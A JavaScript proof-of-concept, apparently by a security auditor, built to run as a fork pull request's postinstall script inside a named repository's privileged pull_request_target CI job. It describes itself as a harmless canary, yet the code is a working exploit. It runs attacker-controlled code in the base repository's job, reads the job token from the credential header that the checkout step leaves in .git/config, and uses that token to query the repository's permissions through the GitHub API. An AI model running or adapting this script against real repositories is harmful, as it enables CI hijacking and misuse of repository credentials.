/*
 * PWN-CANARY-10237 — benign, echo-only audit canary.
 * Purpose: live PoC for finding 10232 — the UNGATED `pull_request_target` pwn-request
 * in pangolindex/dsa-connectors/.github/workflows/status.yml, which checks out the
 * fork-PR head SHA and runs `npm install` in the privileged base-repo job.
 * This file runs as the fork-PR-controlled package.json `postinstall` lifecycle script.
 *
 * Safety properties (benign canary, no impact):
 *   - echo-only marker; no new dependencies; no files written; no builds.
 *   - network egress limited to read-only GETs against api.github.com (the job
 *     token's own authority) that echo ONLY non-secret responses: the repository
 *     permissions map and HTTP status codes.
 *   - NEVER prints the job token or any secret value.
 *   - exits 1 as a fail-safe: the workflow's later steps (status-checks /
 *     bubkoo auto-comment) are skipped, so nothing is ever written to the base repo.
 */
"use strict";
var fs = require("fs");
var https = require("https");
var cp = require("child_process");
var MARK = "PWN-CANARY-10237";

function line() {
  var parts = [];
  for (var i = 0; i < arguments.length; i++) {
    var x = arguments[i];
    parts.push(typeof x === "string" ? x : JSON.stringify(x));
  }
  console.log(MARK + " " + parts.join(" "));
}

line("fork-PR-controlled package.json postinstall EXECUTED in privileged job");
line("GITHUB_REPOSITORY=" + process.env.GITHUB_REPOSITORY);
line("GITHUB_REPOSITORY_OWNER=" + process.env.GITHUB_REPOSITORY_OWNER);
line("GITHUB_WORKFLOW=" + process.env.GITHUB_WORKFLOW);
line("GITHUB_EVENT_NAME=" + process.env.GITHUB_EVENT_NAME);
line("GITHUB_REF=" + process.env.GITHUB_REF);
line("GITHUB_SHA=" + process.env.GITHUB_SHA);
line("GITHUB_HEAD_REF=" + process.env.GITHUB_HEAD_REF);
line("GITHUB_TRIGGERING_ACTOR=" + process.env.GITHUB_TRIGGERING_ACTOR);
line("RUNNER_ENVIRONMENT=" + process.env.RUNNER_ENVIRONMENT);
line("RUNNER_NAME=" + process.env.RUNNER_NAME);
try {
  line("CHECKED_OUT_HEAD=" + cp.execSync("git rev-parse HEAD").toString().trim());
  line("CHECKED_OUT_HEAD_SUBJECT=" + cp.execSync("git log -1 --format=%s").toString().trim());
} catch (e) {
  line("git rev-parse unavailable");
}

/* Resolve the job token WITHOUT ever printing it. */
var token = null;
var tokenSource = "none";
if (process.env.GITHUB_TOKEN) {
  token = process.env.GITHUB_TOKEN;
  tokenSource = "GITHUB_TOKEN env (explicit secrets.GITHUB_TOKEN mapping)";
} else {
  try {
    var cfg = fs.readFileSync(".git/config", "utf8");
    var m = cfg.match(/extraheader\s*=\s*(.+)$/im);
    if (m) {
      var raw = m[1].trim().replace(/^AUTHORIZATION:\s*basic\s+/i, "");
      var decoded = Buffer.from(raw, "base64").toString("utf8");
      var idx = decoded.indexOf(":");
      if (idx > 0) token = decoded.slice(idx + 1);
      tokenSource =
        ".git/config extraheader persisted by actions/checkout@v2 (= job secrets.GITHUB_TOKEN)";
    }
  } catch (e) {
    tokenSource = "unavailable";
  }
}
line("job-token source=" + tokenSource + "; token value NEVER printed");

function get(path) {
  return new Promise(function (resolve) {
    var req = https.request(
      {
        hostname: "api.github.com",
        path: path,
        method: "GET",
        headers: {
          Authorization: "Bearer " + token,
          "User-Agent": "pwn-canary-10237",
          Accept: "application/vnd.github+json",
        },
        timeout: 15000,
      },
      function (res) {
        var body = "";
        res.on("data", function (c) { body += c; });
        res.on("end", function () { resolve({ status: res.statusCode, body: body }); });
      }
    );
    req.on("error", function (e) { resolve({ status: 0, body: "ERR:" + (e.code || e.message) }); });
    req.on("timeout", function () { req.destroy(); resolve({ status: 0, body: "ERR:timeout" }); });
    req.end();
  });
}

(function main() {
  if (!token) {
    line("no job token available; skipping read-only probes");
    line("FAILSAFE exit 1 (no subsequent workflow step will run)");
    process.exit(1);
  }
  get("/repos/pangolindex/dsa-connectors").then(function (r) {
    line("GET /repos/pangolindex/dsa-connectors -> HTTP " + r.status);
    var perms = null;
    try { perms = JSON.parse(r.body).permissions; } catch (e) {}
    line("REPO_PERMISSIONS_MAP=" + (perms ? JSON.stringify(perms) : "unparsed"));
    return get("/repos/pangolindex/dsa-connectors/actions/permissions");
  }).then(function (r) {
    line("GET /repos/.../actions/permissions -> HTTP " + r.status);
    if (r.status === 200) line("ACTIONS_PERMISSIONS_BODY=" + r.body);
    return get("/repos/pangolindex/dsa-connectors/collaborators/adsensey/permission");
  }).then(function (r) {
    line("GET /repos/.../collaborators/adsensey/permission -> HTTP " + r.status);
    line("FAILSAFE exit 1 — status-checks/auto-comment steps skipped; no content written to the base repo");
    process.exit(1);
  }).catch(function () {
    line("probe error (no secret data printed); FAILSAFE exit 1");
    process.exit(1);
  });
})();
